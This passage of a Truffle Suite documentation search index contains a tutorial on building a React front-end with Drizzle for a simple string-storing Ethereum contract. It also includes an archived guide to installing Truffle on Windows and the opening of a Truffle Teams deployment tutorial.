} } export default ReadString ; If everything is working, your app should display \"Hello World\". But first, let's walk through what we did here. When the component mounts \u00b6 componentDidMount () { const { drizzle } = this . props ; const contract = drizzle . contracts . MyStringStore ; // let drizzle know we want to watch the `myString` method const dataKey = contract . methods [ \"myString\" ]. cacheCall (); // save the `dataKey` to local component state for later reference this . setState ({ dataKey }); } When the component mounts, we first grab a reference to the contract we are interested in and assign it to contract . We then need to tell Drizzle to keep track of a variable we are interested in. In order to do that, we call the .cacheCall() function on the myString getter method. What we get in return is a dataKey that allows us to reference this variable. We save this to the component's state so we can use it later. The render method \u00b6 render () { // get the contract state from drizzleState const { MyStringStore } = this . props . drizzleState . contracts ; // using the saved `dataKey`, get the variable we're interested in const myString = MyStringStore . myString [ this . state . dataKey ]; // if it exists, then we display its value return < p > My stored string : { myString && myString . value } < /p>; } From the drizzleState , we grab the slice of the state we are interested in, which in this case is the MyStringStore contract. From there, we use the dataKey we saved from before in order to access the myString variable. Finally, we write myString && myString.value to show the value of the variable if it exists, or nothing otherwise. And in this case, it should show \"Hello World\" since that is the string the contract is initialized with. Quick Recap \u00b6 The most important thing to get out of this section here is that there are two steps to reading a value with Drizzle: First, you need to let Drizzle know what variable you want to watch for. Drizzle will give you a dataKey in return and you need to save it for later reference. Second, due to the asynchronous nature of how Drizzle works, you should be watching for changes in drizzleState . Once the variable accessed by the dataKey exists, you will be able to get the value you are interested in. Write a component to write to the smart contract \u00b6 Of course, simply reading a pre-initialized variable is no fun at all; we want something that we can interact with. In this section, we will create an input box where you can type a string of your choice and have it save to the blockchain forever! First, let's create a new file client/src/SetString.js and paste in the following: import React from \"react\" ; class SetString extends React . Component { state = { stackId : null }; handleKeyDown = e => { // if the enter key is pressed, set the value with the string if ( e . keyCode === 13 ) { this . setValue ( e . target . value ); } }; setValue = value => { const { drizzle , drizzleState } = this . props ; const contract = drizzle . contracts . MyStringStore ; // let drizzle know we want to call the `set` method with `value` const stackId = contract . methods [ \"set\" ]. cacheSend ( value , { from : drizzleState . accounts [ 0 ] }); // save the `stackId` for later reference this . setState ({ stackId }); }; getTxStatus = () => { // get the transaction states from the drizzle state const { transactions , transactionStack } = this . props . drizzleState ; // get the transaction hash using our saved `stackId` const txHash = transactionStack [ this . state . stackId ]; // if transaction hash does not exist, don't display anything if ( ! txHash ) return null ; // otherwise, return the transaction status return `Transaction status: ${ transactions [ txHash ] && transactions [ txHash ]. status } ` ; }; render () { return ( < div > < input type = \"text\" onKeyDown = { this . handleKeyDown } /> < div > { this . getTxStatus ()} < /div> < /div> ); } } export default SetString ; At this point, import and include it inside App.js just like you did with the ReadString component: import SetString from \"./SetString\" ; // ... render () { if ( this . state . loading ) return \"Loading Drizzle...\" ; return ( < div className = \"App\" > < ReadString drizzle = { this . props . drizzle } drizzleState = { this . state . drizzleState } /> < SetString drizzle = { this . props . drizzle } drizzleState = { this . state . drizzleState } /> < /div> ); } At this point, the app should work and you should try it out. You should be able to type something into the input text box, hit Enter, and Drizzle's react store will automatically display the new string. Next, let's go through SetString.js step-by-step. General structure \u00b6 First let's take a look at the general React.js boilerplate that we need. class SetString extends React . Component { state = { stackId : null }; handleKeyDown = e => { // if the enter key is pressed, set the value with the string if ( e . keyCode === 13 ) { this . setValue ( e . target . value ); } }; setValue = value => { ... }; getTxStatus = () => { ... }; render () { return ( < div > < input type = \"text\" onKeyDown = { this . handleKeyDown } /> < div > { this . getTxStatus ()} < /div> < /div> ); } } In this component, we will have an input text box for the user to type in a string, and when the Enter key is pressed, the setValue method will be called with the string as a parameter. Also, we will display the status of the transaction. The getTxStatus method will return a string displaying the status of the transaction by referencing a stackId state variable (more on this later). Submitting the transaction \u00b6 setValue = value => { const { drizzle , drizzleState } = this . props ; const contract = drizzle . contracts . MyStringStore ; // let drizzle know we want to call the `set` method with `value` const stackId = contract . methods [ \"set\" ]. cacheSend ( value , { from : drizzleState . accounts [ 0 ] }); // save the `stackId` for later reference this . setState ({ stackId }); }; We first assign the contract from the drizzle instance into contract , and then we call cacheSend() on the method we are interested in (i.e. set ). Then we pass in the string we want to set (i.e. value ) as well as our transaction options (in this case, just the from field). Note that we can get our current account address from drizzleState.accounts[0] . What we get in return is a stackId , which is a reference to the transaction that we want to execute. Ethereum transactions don't receive a hash until they're broadcast to the network. In case an error occurs before broadcast, Drizzle keeps track of these transactions by giving each it's own ID. Once successfully broadcasted, the stackId will point to the transaction hash, so we save it in our local component state for later usage. Tracking transaction status \u00b6 getTxStatus = () => { // get the transaction states from the drizzle state const { transactions , transactionStack } = this . props . drizzleState ; // get the transaction hash using our saved `stackId` const txHash = transactionStack [ this . state . stackId ]; // if transaction hash does not exist, don't display anything if ( ! txHash ) return null ; // otherwise, return the transaction status return `Transaction status: ${ transactions [ txHash ] && transactions [ txHash ]. status } ` ; }; Now that we have a stackId saved into our local component state, we can use this to check the status of our transaction. First, we need the transactions and transactionStack slices of state from drizzleState . Then, we can get the transaction hash (assigned to txHash ) via transactionStack[stackId] . If the hash does not exist, then we know that the transaction has not been broadcasted yet and we return null. Otherwise, we display a string to show the status of our transaction. Usually, this will either be \"pending\" or \"success\". The End \u00b6 Congratulations! You have taken a huge step to understanding how Drizzle works. Of course, this is only the beginning, you can use tools like drizzle-react to help you integrate Drizzle into your dapp, reducing the necessary boilerplate that you would have to write. Alternatively, you could also bootstrap your Drizzle dapp with our Truffle box .","title":"Getting Started with Drizzle and React"},{"location":"guides/getting-started-with-drizzle-and-react/index.html#getting-started-with-drizzle-and-react","text":"Drizzle is the newest member of the Truffle Suite and our first front-end development tool. At its core, Drizzle takes care of synchronizing your contract data, transaction data and more from the blockchain to a Redux store. There are also higher-level abstractions on top of the base drizzle library; tools for React compatibility ( drizzle-react ) and a set of ready-to-use React components ( drizzle-react-components ). We're going to focus on the lower levels today, taking you through setting up a Truffle project with React and Drizzle from scratch. This way we can gain the best understanding of how Drizzle works under the hood. With this knowledge, you can leverage the full power of Drizzle with any front-end framework of your choosing, or use the higher-level React abstractions with confidence. This will be a very minimal tutorial focused on setting and getting a simple string stored in a contract. It's meant for those with a basic knowledge of Truffle, who have some knowledge of JavaScript and React.js, but who are new to using Drizzle. Note : For Truffle basics, please read through the Truffle Pet Shop tutorial before proceeding. In this tutorial we will be covering: Setting up the development environment Creating a Truffle project from scratch Writing the smart contract Compiling and migrating the smart contract Testing the smart contract Creating our React.js project Wiring up the front-end client Wire up the React app with Drizzle Write a component to read from Drizzle Write a component to write to the smart contract","title":"Getting Started with Drizzle and React"},{"location":"guides/getting-started-with-drizzle-and-react/index.html#setting-up-the-development-environment","text":"There are a few technical requirements before we start. Please install the following: Node.js v8+ LTS and npm (comes with Node)","title":"Setting up the development environment"},{"location":"guides/getting-started-with-drizzle-and-react/index.html#truffle","text":"Once we have those installed, we only need one command to install Truffle: npm install -g truffle To verify that Truffle is installed properly, type truffle version on a terminal. If you see an error, make sure that your npm modules are added to your path.","title":"Truffle"},{"location":"guides/getting-started-with-drizzle-and-react/index.html#create-react-app","text":"Finally, since this is a React.js tutorial, we will be creating our React project with Create-React-App . You won't have to do anything if you have NPM version 5.2 or above. You can check your NPM version by running npm --version . If you do not, then you will need to install the tool globally with this command: npm install -g create-react-app","title":"Create-React-App"},{"location":"guides/getting-started-with-drizzle-and-react/index.html#creating-a-truffle-project","text":"Truffle initializes in the current directory, so first create a directory in your development folder of choice and then move inside it. mkdir drizzle-react-tutorial cd drizzle-react-tutorial Now we're ready to spawn our empty Truffle project by running the following command: truffle init Let's take a brief look at the directory structure that was just generated.","title":"Creating a Truffle project"},{"location":"guides/getting-started-with-drizzle-and-react/index.html#directory-structure","text":"The default Truffle directory structure contains the following: contracts/ : Contains the Solidity source files for our smart contracts. There is an important contract in here called Migrations.sol , which we'll talk about later. migrations/ : Truffle uses a migration system to handle smart contract deployments. A migration is an additional special smart contract that keeps track of changes. test/ : Contains both JavaScript and Solidity tests for our smart contracts. truffle-config.js : Truffle configuration file.","title":"Directory structure"},{"location":"guides/getting-started-with-drizzle-and-react/index.html#writing-our-smart-contract","text":"We'll add a simple smart contract called MyStringStore. Create a new file named MyStringStore.sol in the contracts/ directory. Add the following content to the file: pragma solidity ^ 0.5.0 ; contract MyStringStore { string public myString = \"Hello World\" ; function set ( string memory x ) public { myString = x ; } } Since this isn't a Solidity tutorial, all you need to know about this is: We've created a public string variable named myString and initialized it to \"Hello World\". This automatically creates a getter (since it's a public variable) so we don't have to write one ourselves. We've created a setter method that simply sets the myString variable with whatever string is passed in.","title":"Writing our smart contract"},{"location":"guides/getting-started-with-drizzle-and-react/index.html#launching-a-test-blockchain-with-truffle-develop","text":"Before we move ahead, let's first launch our test blockchain with the Truffle Develop console. Open up a new terminal, navigate to the project directory, and run the following command: truffle develop This will spawn a new blockchain that listens on 127.0.0.1:9545 by default.","title":"Launching a test blockchain with Truffle Develop"},{"location":"guides/getting-started-with-drizzle-and-react/index.html#compiling-and-migrating-the-smart-contract","text":"Now we are ready to compile and migrate our contract.","title":"Compiling and migrating the smart contract"},{"location":"guides/getting-started-with-drizzle-and-react/index.html#compilation","text":"In the Truffle Develop console, type the following command: compile Note : If you're on Windows and encountering problems running this command, please see the documentation on [resolving naming conflicts on Windows](/docs/advanced/configuration#resolving-naming-conflicts-on-windows). You should see output similar to the following: Compiling ./contracts/Migrations.sol... Compiling ./contracts/MyStringStore.sol... Writing artifacts to ./build/contracts","title":"Compilation"},{"location":"guides/getting-started-with-drizzle-and-react/index.html#migration","text":"Now that we've successfully compiled our contracts, it's time to migrate them to the blockchain! Note : Read more about migrations in the [Truffle documentation](/docs/getting_started/migrations). To create our own migration script. Create a new file named 2_deploy_contracts.js in the migrations/ directory. Add the following content to the 2_deploy_contracts.js file: const MyStringStore = artifacts . require ( \"MyStringStore\" ); module . exports = function ( deployer ) { deployer . deploy ( MyStringStore ); }; Back in our Truffle Develop console, migrate the contract to the blockchain. migrate You should see the migrations being executed in order, with the details of each migration listed.","title":"Migration"},{"location":"guides/getting-started-with-drizzle-and-react/index.html#testing-the-smart-contract","text":"Before we proceed, we should write a couple tests to ensure that our contract works as expected. Create a new file named MyStringStore.js in the test/ directory. Add the following content to the MyStringStore.js file: const MyStringStore = artifacts . require ( \"./MyStringStore.sol\" ); contract ( \"MyStringStore\" , accounts => { it ( \"should store the string 'Hey there!'\" , async () => { const myStringStore = await MyStringStore . deployed (); // Set myString to \"Hey there!\" await myStringStore . set ( \"Hey there!\" , { from : accounts [ 0 ] }); // Get myString from public variable getter const storedString = await myStringStore . myString . call (); assert . equal ( storedString , \"Hey there!\" , \"The string was not stored\" ); }); });","title":"Testing the smart contract"},{"location":"guides/getting-started-with-drizzle-and-react/index.html#running-the-tests","text":"Back in the Truffle Develop console, run the tests: test If all the tests pass, you'll see console output similar to this: Using network 'develop'. Contract: MyStringStore \u2713 should store the string 'Hey there!' (98ms) 1 passing (116ms) Awesome! Now we know that the contract actually works.","title":"Running the tests"},{"location":"guides/getting-started-with-drizzle-and-react/index.html#creating-our-reactjs-project","text":"Now that we are done with the smart contract, we can write our front-end client with React.js! In order to do this, open another terminal, navigate to your project directory, and simply run this command (if you have NPM version 5.2 or above): npx create-react-app client If you have an older version of NPM , make sure Create-React-App is installed globally as per the instructions in the Setting up the development environment section and then run the following: create-react-app client This should create a client directory in your Truffle project and bootstrap a barebones React.js project for you to start building your front-end with.","title":"Creating our React.js project"},{"location":"guides/getting-started-with-drizzle-and-react/index.html#wiring-up-the-front-end-client","text":"Since Create-React-App's default behavior disallows importing files from outside of the src folder, we need to bring the contracts in our build folder inside src . We can copy and paste them every time we compile our contracts, but a better way is to simply configure Truffle to put the files there. In the truffle-config.js file, replace the contents with the following: const path = require ( \"path\" ); module . exports = { contracts_build_directory : path . join ( __dirname , \"client/src/contracts\" ) }; This will make sure to output the contract build artifacts directory inside your React project. But this also means we'll have to restart our Truffle Develop console. Press CTRL + C to exit out of the Truffle Develop console and then start it again with truffle develop . From there, make sure you run the compile and migrate commands again so that the new build artifacts will be output into the new folder. If you are encountering issues, try migrate --reset for a clean migration from scratch.","title":"Wiring up the front-end client"},{"location":"guides/getting-started-with-drizzle-and-react/index.html#install-drizzle","text":"This is the most delicious part, we install Drizzle. Make sure you are in the client directory and then run the following: npm install @drizzle/store And that's it for dependencies! Note that we don't need to install Web3.js or @truffle/contract ourselves. Drizzle contains everything we need to work reactively with our smart contracts.","title":"Install Drizzle"},{"location":"guides/getting-started-with-drizzle-and-react/index.html#wire-up-the-react-app-with-drizzle","text":"Before we go further, let's start our React app by running the follow command inside our client directory: npm start This will serve the front-end under localhost:3000 , so open that up in your browser. Note : Make sure to use an incognito window if you already have MetaMask installed (or disable MetaMask for now). Otherwise, the app will try to use the network specified in MetaMask rather than the develop network under `localhost:9545`. If the default Create-React-App page loaded without any issues, you may proceed.","title":"Wire up the React app with Drizzle"},{"location":"guides/getting-started-with-drizzle-and-react/index.html#setup-the-store","text":"The first thing we need to do is to setup and instantiate the Drizzle store. We are going add the following code to client/src/index.js : // import drizzle functions and contract artifact import { Drizzle } from \"@drizzle/store\" ; import MyStringStore from \"./contracts/MyStringStore.json\" ; // let drizzle know what contracts we want and how to access our test blockchain const options = { contracts : [ MyStringStore ], web3 : { fallback : { type : \"ws\" , url : \"ws://127.0.0.1:9545\" , }, }, }; // setup drizzle const drizzle = new Drizzle ( options ); First, we imported the tools from Drizzle as well as the contract definition. We then built our options object for Drizzle, which in this case is just specifying the specific contract we want to be loaded by passing in the JSON build artifact. And finally, we created the drizzleStore and used that to create our drizzle instance which we will pass in as a prop to our App component. Once that is complete, your index.js should look something like this: import React from 'react' ; import ReactDOM from 'react-dom' ; import './index.css' ; import App from './App' ; import * as serviceWorker from './serviceWorker' ; // import drizzle functions and contract artifact import { Drizzle , generateStore } from \"@drizzle/store\" ; import MyStringStore from \"./contracts/MyStringStore.json\" ; // let drizzle know what contracts we want and how to access our test blockchain const options = { contracts : [ MyStringStore ], web3 : { fallback : { type : \"ws\" , url : \"ws://127.0.0.1:9545\" , }, }, }; // setup the drizzle store and drizzle const drizzle = new Drizzle ( options ); ReactDOM . render ( < App drizzle = { drizzle } /> , document . getElementById ( 'root' )); Note again that the drizzle instance is passed into the App component as props.","title":"Setup the store"},{"location":"guides/getting-started-with-drizzle-and-react/index.html#wire-up-the-app-component","text":"Now that we have a drizzle instance to play around with, we can go into client/src/App.js to start working with the React API.","title":"Wire up the App component"},{"location":"guides/getting-started-with-drizzle-and-react/index.html#adding-state-variables","text":"First thing we will do is to add the following line inside our App component: state = { loading : true , drizzleState : null }; We are going to be using two state variables here: loading \u2014 Indicates if Drizzle has finished initializing and the app is ready. The initialization process includes instantiating web3 and our smart contracts, fetching any available Ethereum accounts and listening (or, in cases where subscriptions are not supported: polling) for new blocks. drizzleState \u2014 This is where we will store the state of the Drizzle store in our top-level component. If we can keep this state variable up-to-date, then we can simply use simple props and state to work with Drizzle (i.e. you don't have to use any Redux or advanced React patterns).","title":"Adding state variables"},{"location":"guides/getting-started-with-drizzle-and-react/index.html#adding-some-initialization-logic","text":"Next we will add in our componentDidMount method into the component class so that we can run some initialization logic. componentDidMount () { const { drizzle } = this . props ; // subscribe to changes in the store this . unsubscribe = drizzle . store . subscribe (() => { // every time the store updates, grab the state from drizzle const drizzleState = drizzle . store . getState (); // check to see if it's ready, if so, update local component state if ( drizzleState . drizzleStatus . initialized ) { this . setState ({ loading : false , drizzleState }); } }); } First, we grab the drizzle instance from the props, then we call drizzle.store.subscribe and pass in a callback function. This callback function is called whenever the Drizzle store is updated. Note that this store is actually a Redux store under the hood, so this might look familiar if you've used Redux previously. Whenever the store is updated, we will try to grab the state with drizzle.store.getState() and then if Drizzle is initialized and ready, we will set loading to false, and also update the drizzleState state variable. By doing this, drizzleState will always be up-to-date and we also know exactly when Drizzle is ready so we can use a loading component to let the user know.","title":"Adding some initialization logic"},{"location":"guides/getting-started-with-drizzle-and-react/index.html#unsubscribing-from-the-store","text":"Note that we assign the return value of the subscribe() to a class variable this.unsubscribe . This is because it is always good practice to unsubscribe from any subscriptions you have when the component un-mounts. In order to do this, we save a reference to that subscription (i.e. this.unsubscribe ), and inside componentWillUnmount , we have the following: componentWillUnmount () { this . unsubscribe (); } This will safely unsubscribe when the App component un-mounts so we can prevent any memory leaks.","title":"Unsubscribing from the store"},{"location":"guides/getting-started-with-drizzle-and-react/index.html#replace-the-render-method","text":"Finally, we can replace the boilerplate render method with something that applies to us better: render () { if ( this . state . loading ) return \"Loading Drizzle...\" ; return < div className = \"App\" > Drizzle is ready < /div>; } In the next section, we will replace \"Drizzle is ready\" with an actual component that will read from the store. If you refresh your browser and run this app now, you should see \"Loading Drizzle...\" briefly flash on screen and then subsequently \"Drizzle is ready\".","title":"Replace the render method"},{"location":"guides/getting-started-with-drizzle-and-react/index.html#full-component-code","text":"When you are done this section, your App component should look like the following: class App extends Component { state = { loading : true , drizzleState : null }; componentDidMount () { const { drizzle } = this . props ; // subscribe to changes in the store this . unsubscribe = drizzle . store . subscribe (() => { // every time the store updates, grab the state from drizzle const drizzleState = drizzle . store . getState (); // check to see if it's ready, if so, update local component state if ( drizzleState . drizzleStatus . initialized ) { this . setState ({ loading : false , drizzleState }); } }); } componentWillUnmount () { this . unsubscribe (); } render () { if ( this . state . loading ) return \"Loading Drizzle...\" ; return < div className = \"App\" > Drizzle is ready < /div>; } }","title":"Full component code"},{"location":"guides/getting-started-with-drizzle-and-react/index.html#write-a-component-to-read-from-drizzle","text":"First, let's create a new file at client/src/ReadString.js and paste in the following: import React from \"react\" ; class ReadString extends React . Component { componentDidMount () { const { drizzle , drizzleState } = this . props ; console . log ( drizzle ); console . log ( drizzleState ); } render () { return < div > ReadString Component < /div>; } } export default ReadString ; And then inside App.js , import the new component with this statement: import ReadString from \"./ReadString\" ; Now modify your App.js render method so that we pass in the drizzle instance from props as well as the drizzleState from the component state: render () { if ( this . state . loading ) return \"Loading Drizzle...\" ; return ( < div className = \"App\" > < ReadString drizzle = { this . props . drizzle } drizzleState = { this . state . drizzleState } /> < /div> ); } Go back to the browser and open up your console. You should see that the two console.log statements are working and they are displaying both the drizzle instance as well as a drizzleState that is fully initialized. What this tells us is that the drizzleState we get in this component will always be fully ready once this component mounts. At this point, you can take some time to explore the drizzle instance object as well as the drizzleState object.","title":"Write a component to read from Drizzle"},{"location":"guides/getting-started-with-drizzle-and-react/index.html#drizzle-instance-and-drizzlestate","text":"For the most part, drizzleState is there for you to read information from (i.e. contract state variables, return values, transaction status, account data, etc.), whereas the drizzle instance is what you will use to actually get stuff done (i.e. call contract methods, the Web3 instance, etc.).","title":"drizzle instance and drizzleState"},{"location":"guides/getting-started-with-drizzle-and-react/index.html#wiring-up-the-readstring-component","text":"Now that we have access to our drizzle instance and the drizzleState , we can put in the logic that allows us read the smart contract variable we are interested in. Here is what the full code of ReadString.js should look like: import React from \"react\" ; class ReadString extends React . Component { state = { dataKey : null }; componentDidMount () { const { drizzle } = this . props ; const contract = drizzle . contracts . MyStringStore ; // let drizzle know we want to watch the `myString` method const dataKey = contract . methods [ \"myString\" ]. cacheCall (); // save the `dataKey` to local component state for later reference this . setState ({ dataKey }); } render () { // get the contract state from drizzleState const { MyStringStore } = this . props . drizzleState . contracts ; // using the saved `dataKey`, get the variable we're interested in const myString = MyStringStore . myString [ this . state . dataKey ]; // if it exists, then we display its value return < p > My stored string : { myString && myString . value } < /p>; } } export default ReadString ; If everything is working, your app should display \"Hello World\". But first, let's walk through what we did here.","title":"Wiring up the ReadString component"},{"location":"guides/getting-started-with-drizzle-and-react/index.html#when-the-component-mounts","text":"componentDidMount () { const { drizzle } = this . props ; const contract = drizzle . contracts . MyStringStore ; // let drizzle know we want to watch the `myString` method const dataKey = contract . methods [ \"myString\" ]. cacheCall (); // save the `dataKey` to local component state for later reference this . setState ({ dataKey }); } When the component mounts, we first grab a reference to the contract we are interested in and assign it to contract . We then need to tell Drizzle to keep track of a variable we are interested in. In order to do that, we call the .cacheCall() function on the myString getter method. What we get in return is a dataKey that allows us to reference this variable. We save this to the component's state so we can use it later.","title":"When the component mounts"},{"location":"guides/getting-started-with-drizzle-and-react/index.html#the-render-method","text":"render () { // get the contract state from drizzleState const { MyStringStore } = this . props . drizzleState . contracts ; // using the saved `dataKey`, get the variable we're interested in const myString = MyStringStore . myString [ this . state . dataKey ]; // if it exists, then we display its value return < p > My stored string : { myString && myString . value } < /p>; } From the drizzleState , we grab the slice of the state we are interested in, which in this case is the MyStringStore contract. From there, we use the dataKey we saved from before in order to access the myString variable. Finally, we write myString && myString.value to show the value of the variable if it exists, or nothing otherwise. And in this case, it should show \"Hello World\" since that is the string the contract is initialized with.","title":"The render method"},{"location":"guides/getting-started-with-drizzle-and-react/index.html#quick-recap","text":"The most important thing to get out of this section here is that there are two steps to reading a value with Drizzle: First, you need to let Drizzle know what variable you want to watch for. Drizzle will give you a dataKey in return and you need to save it for later reference. Second, due to the asynchronous nature of how Drizzle works, you should be watching for changes in drizzleState . Once the variable accessed by the dataKey exists, you will be able to get the value you are interested in.","title":"Quick Recap"},{"location":"guides/getting-started-with-drizzle-and-react/index.html#write-a-component-to-write-to-the-smart-contract","text":"Of course, simply reading a pre-initialized variable is no fun at all; we want something that we can interact with. In this section, we will create an input box where you can type a string of your choice and have it save to the blockchain forever! First, let's create a new file client/src/SetString.js and paste in the following: import React from \"react\" ; class SetString extends React . Component { state = { stackId : null }; handleKeyDown = e => { // if the enter key is pressed, set the value with the string if ( e . keyCode === 13 ) { this . setValue ( e . target . value ); } }; setValue = value => { const { drizzle , drizzleState } = this . props ; const contract = drizzle . contracts . MyStringStore ; // let drizzle know we want to call the `set` method with `value` const stackId = contract . methods [ \"set\" ]. cacheSend ( value , { from : drizzleState . accounts [ 0 ] }); // save the `stackId` for later reference this . setState ({ stackId }); }; getTxStatus = () => { // get the transaction states from the drizzle state const { transactions , transactionStack } = this . props . drizzleState ; // get the transaction hash using our saved `stackId` const txHash = transactionStack [ this . state . stackId ]; // if transaction hash does not exist, don't display anything if ( ! txHash ) return null ; // otherwise, return the transaction status return `Transaction status: ${ transactions [ txHash ] && transactions [ txHash ]. status } ` ; }; render () { return ( < div > < input type = \"text\" onKeyDown = { this . handleKeyDown } /> < div > { this . getTxStatus ()} < /div> < /div> ); } } export default SetString ; At this point, import and include it inside App.js just like you did with the ReadString component: import SetString from \"./SetString\" ; // ... render () { if ( this . state . loading ) return \"Loading Drizzle...\" ; return ( < div className = \"App\" > < ReadString drizzle = { this . props . drizzle } drizzleState = { this . state . drizzleState } /> < SetString drizzle = { this . props . drizzle } drizzleState = { this . state . drizzleState } /> < /div> ); } At this point, the app should work and you should try it out. You should be able to type something into the input text box, hit Enter, and Drizzle's react store will automatically display the new string. Next, let's go through SetString.js step-by-step.","title":"Write a component to write to the smart contract"},{"location":"guides/getting-started-with-drizzle-and-react/index.html#general-structure","text":"First let's take a look at the general React.js boilerplate that we need. class SetString extends React . Component { state = { stackId : null }; handleKeyDown = e => { // if the enter key is pressed, set the value with the string if ( e . keyCode === 13 ) { this . setValue ( e . target . value ); } }; setValue = value => { ... }; getTxStatus = () => { ... }; render () { return ( < div > < input type = \"text\" onKeyDown = { this . handleKeyDown } /> < div > { this . getTxStatus ()} < /div> < /div> ); } } In this component, we will have an input text box for the user to type in a string, and when the Enter key is pressed, the setValue method will be called with the string as a parameter. Also, we will display the status of the transaction. The getTxStatus method will return a string displaying the status of the transaction by referencing a stackId state variable (more on this later).","title":"General structure"},{"location":"guides/getting-started-with-drizzle-and-react/index.html#submitting-the-transaction","text":"setValue = value => { const { drizzle , drizzleState } = this . props ; const contract = drizzle . contracts . MyStringStore ; // let drizzle know we want to call the `set` method with `value` const stackId = contract . methods [ \"set\" ]. cacheSend ( value , { from : drizzleState . accounts [ 0 ] }); // save the `stackId` for later reference this . setState ({ stackId }); }; We first assign the contract from the drizzle instance into contract , and then we call cacheSend() on the method we are interested in (i.e. set ). Then we pass in the string we want to set (i.e. value ) as well as our transaction options (in this case, just the from field). Note that we can get our current account address from drizzleState.accounts[0] . What we get in return is a stackId , which is a reference to the transaction that we want to execute. Ethereum transactions don't receive a hash until they're broadcast to the network. In case an error occurs before broadcast, Drizzle keeps track of these transactions by giving each it's own ID. Once successfully broadcasted, the stackId will point to the transaction hash, so we save it in our local component state for later usage.","title":"Submitting the transaction"},{"location":"guides/getting-started-with-drizzle-and-react/index.html#tracking-transaction-status","text":"getTxStatus = () => { // get the transaction states from the drizzle state const { transactions , transactionStack } = this . props . drizzleState ; // get the transaction hash using our saved `stackId` const txHash = transactionStack [ this . state . stackId ]; // if transaction hash does not exist, don't display anything if ( ! txHash ) return null ; // otherwise, return the transaction status return `Transaction status: ${ transactions [ txHash ] && transactions [ txHash ]. status } ` ; }; Now that we have a stackId saved into our local component state, we can use this to check the status of our transaction. First, we need the transactions and transactionStack slices of state from drizzleState . Then, we can get the transaction hash (assigned to txHash ) via transactionStack[stackId] . If the hash does not exist, then we know that the transaction has not been broadcasted yet and we return null. Otherwise, we display a string to show the status of our transaction. Usually, this will either be \"pending\" or \"success\".","title":"Tracking transaction status"},{"location":"guides/getting-started-with-drizzle-and-react/index.html#the-end","text":"Congratulations! You have taken a huge step to understanding how Drizzle works. Of course, this is only the beginning, you can use tools like drizzle-react to help you integrate Drizzle into your dapp, reducing the necessary boilerplate that you would have to write. Alternatively, you could also bootstrap your Drizzle dapp with our Truffle box .","title":"The End"},{"location":"guides/how-to-install-truffle-and-testrpc-on-windows-for-blockchain-development/index.html","text":"Archived: This tutorial has been archived and may not work as expected; versions are out of date, methods and workflows may have changed. We leave these up for historical context and for any universally useful information contained. David Burela now recommends a different, updated way of doing this on his blog, which you can check out here: How to install Truffle & TestRPC on Ubuntu or Windows 10 with ?\"Windows subsystem for Linux\" Update : Since this tutorial was published, we have released Ganache , a personal blockchain and a replacement to the TestRPC. We have left this tutorial unaltered, but we highly recommend checking out our Ganache Documentation This post was originally published by David Burela on his blog Burela's House-o-blog . Big thanks to David for allowing us publish it here! I have been doing a bunch of Blockchain development work, one of which was recently featured on the front page of the Australian Financial Review and on Microsoft\u2019s news website . One of the trickiest things has been trying to get Windows environments correctly configured, as the tools are npm based and want to be compiled natively and assumes it is on a Linux machine. Here is the simplest install script I have found Step 0. Pre-step: Install Chocolatey \u00b6 Install Chocolatey via https://chocolatey.org/ Step 1. Install Windows tools with Chocolatey: \u00b6 Open a PowerShell prompt as an Administrator and run the following commands (last command optional): $ choco install nodejs.install \u2013y $ choco install git \u2013y $ choco install VisualStudioCode -y Read more about configuring Visual Studio code for Blockchain development . Step 2. Install the tools via npm: \u00b6 Open a NEW PowerShell prompt as Administrator (to ensure that it reloads), then run the following commands: $ npm install -g npm $ npm install -g -production windows-build-tools $ npm install -g ethereumjs-testrpc $ npm install -g truffle You may see some error messages during npm installs. Many of these are just informational / optional components failing. You can test that it is all working by trying to run the commands truffle and testrpc. Bonus Step: combining with Visual Studio Code \u00b6 This is how I use Truffle & Visual Studio code together. Make sure you install and configure Visual Studio Code with the Solidity extensions . If you navigate into the folder where your files are, typing \u201ccode .\u201d will open Visual Studio Code in the current folder. Running the command after a truffle init gets you up and running quickly","title":"Truffle Suite"},{"location":"guides/how-to-install-truffle-and-testrpc-on-windows-for-blockchain-development/index.html#step-0-pre-step-install-chocolatey","text":"Install Chocolatey via https://chocolatey.org/","title":"Step 0. Pre-step: Install Chocolatey"},{"location":"guides/how-to-install-truffle-and-testrpc-on-windows-for-blockchain-development/index.html#step-1-install-windows-tools-with-chocolatey","text":"Open a PowerShell prompt as an Administrator and run the following commands (last command optional): $ choco install nodejs.install \u2013y $ choco install git \u2013y $ choco install VisualStudioCode -y Read more about configuring Visual Studio code for Blockchain development .","title":"Step 1. Install Windows tools with Chocolatey:"},{"location":"guides/how-to-install-truffle-and-testrpc-on-windows-for-blockchain-development/index.html#step-2-install-the-tools-via-npm","text":"Open a NEW PowerShell prompt as Administrator (to ensure that it reloads), then run the following commands: $ npm install -g npm $ npm install -g -production windows-build-tools $ npm install -g ethereumjs-testrpc $ npm install -g truffle You may see some error messages during npm installs. Many of these are just informational / optional components failing. You can test that it is all working by trying to run the commands truffle and testrpc.","title":"Step 2. Install the tools via npm:"},{"location":"guides/how-to-install-truffle-and-testrpc-on-windows-for-blockchain-development/index.html#bonus-step-combining-with-visual-studio-code","text":"This is how I use Truffle & Visual Studio code together. Make sure you install and configure Visual Studio Code with the Solidity extensions . If you navigate into the folder where your files are, typing \u201ccode .\u201d will open Visual Studio Code in the current folder. Running the command after a truffle init gets you up and running quickly","title":"Bonus Step: combining with Visual Studio Code"},{"location":"guides/learn-how-to-deploy-with-truffle-teams/index.html","text":"In this tutorial, you'll learn how to deploy your smart contracts to a public Ethereum network using Truffle Teams. Prerequisites \u00b6 This tutorial assumes that you've already done the following: - Created a Truffle Teams account - Linked a repo that is a Truffle project (need a project? Grab our MetaCoin box with truffle unbox metacoin in an empty directory, and push that to your own repository) - Got a passing build within Truffle Teams - Grabbed some Ropsten Ether - Ensured you'll have a stable network connection The Deployments Page \u00b6 Head over to Truffle Teams . On the left navigation bar, click the item near the top labelled DEPLOYMENTS next to the parachute icon. Here you'll see a list of your repositories. Click on the one you'd like to deploy. This will bring you to the deployments page. You'll notice there are three columns: Commits , Staging , and Production . Commits Column \u00b6 Commits is a list of all the commits that Truffle Teams is processing, or has processed, as a build. Each will have a status icon to show if the build is in progress, failed, or successful. Commits with a successful icon (a green box with a checkmark, as pictured) will be able to be deployed; the parachute icon in the top right of the commit indicates this. Staging and Production Columns \u00b6 Staging contains a list of all testnet (i.e. Ropsten, G\u00f6rli, Rinkeby, and Kovan) deployments. Production contains a list of Mainnet deployments. We'll expand more on how these work later in the tutorial. Your First Deployment \u00b6 Currently, 